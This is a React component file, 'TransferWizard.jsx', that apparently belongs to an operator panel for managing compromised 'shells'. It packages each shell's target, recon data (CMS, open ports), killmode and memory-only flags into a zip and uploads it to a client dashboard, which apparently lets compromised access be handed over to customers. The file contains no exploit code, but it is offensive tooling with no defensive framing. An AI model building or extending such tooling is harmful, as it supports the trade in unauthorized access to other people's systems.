// MINC - TransferWizard.jsx (One-Click Deploy-to-Client Mode)

import React, { useState } from 'react';
import JSZip from 'jszip';

const TransferWizard = ({ shell, onClose }) => {
  const [clientId, setClientId] = useState('');
  const [status, setStatus] = useState('');
  const [copied, setCopied] = useState(false);

  const generateMarkdown = (meta) => {
    return `
# Shell Transfer Report

- **Shell ID**: ${meta.shell_id}
- **Client ID**: ${meta.client_id}
- **Target**: ${meta.target}
- **Platform**: ${meta.platform}
- **Tags**: ${meta.tags.join(', ')}
- **Modules**: ${meta.modules.join(', ') || 'None'}
- **Attitude**: ${meta.attitude}
- **Transfer Date**: ${meta.transfer_date}
- **Memory Only**: ${meta.memory_flag}
- **Killmode**: ${meta.kill_flag}
- **Last Seen**: ${meta.last_seen || 'unknown'}

## Recon Summary
**Platform:** ${meta.recon?.platform || 'n/a'}  
**CMS:** ${meta.recon?.cms || 'n/a'}  
**Open Ports:** ${meta.recon?.open_ports?.join(', ') || 'n/a'}
    `.trim();
  };

  const handleDeploy = async () => {
    if (!clientId.trim()) return alert("⚠️ Client ID required.");

    const now = new Date().toISOString();
    const meta = {
      shell_id: shell.shell_id,
      client_id: clientId,
      transfer_uuid: `xfer-${shell.shell_id}-${clientId}`,
      transfer_date: now,
      target: shell.target,
      platform: shell.platform,
      attitude: shell.attitude || "unknown",
      tags: [...(shell.tags || []), "client"],
      modules: shell.modules || [],
      recon: shell.recon_fingerprint || {},
      memory_flag: shell.memory_flag || false,
      kill_flag: shell.kill_flag || false,
      last_seen: shell.last_seen || now
    };

    // Clipboard copy
    navigator.clipboard.writeText(meta.transfer_uuid).then(() => setCopied(true));

    // Generate zip package
    const zip = new JSZip();
    zip.file(`transfer_${shell.shell_id}.json`, JSON.stringify(meta, null, 2));
    zip.file(`shell_snapshot_${shell.shell_id}.md`, generateMarkdown(meta));

    const zipBlob = await zip.generateAsync({ type: "blob" });
    const zipFile = new File([zipBlob], `client_package_${shell.shell_id}.zip`, {
      type: "application/zip"
    });

    // Download fallback
    const link = document.createElement("a");
    link.href = URL.createObjectURL(zipBlob);
    link.download = zipFile.name;
    link.click();

    // Upload to client dashboard endpoint
    const form = new FormData();
    form.append("package", zipFile);
    form.append("client_id", clientId);

    fetch("/client_upload/", {
      method: "POST",
      body: form
    }).then((res) => {
      if (res.ok) {
        setStatus("✅ Shell deployed to client dashboard + package downloaded.");
      } else {
        setStatus("⚠️ Uploaded failed, but package was saved locally.");
      }
    }).catch(() => {
      setStatus("⚠️ Upload failed. Package downloaded locally for manual transfer.");
    });
  };

  return (
    <div className="transfer-wizard">
      <h3>🚚 Transfer Shell: {shell.shell_id}</h3>

      <label>Client ID (Secure)</label>
      <input
        type="text"
        placeholder="e.g. client_europe_01"
        value={clientId}
        onChange={(e) => setClientId(e.target.value)}
      />

      <button onClick={handleDeploy}>☁ One-Click Deploy to Client</button>
      <button onClick={onClose}>✖ Cancel</button>

      {status && <div className="status-success">{status}</div>}
      {copied && <div className="status-success">📋 UUID copied to clipboard</div>}
    </div>
  );
};

export default TransferWizard;

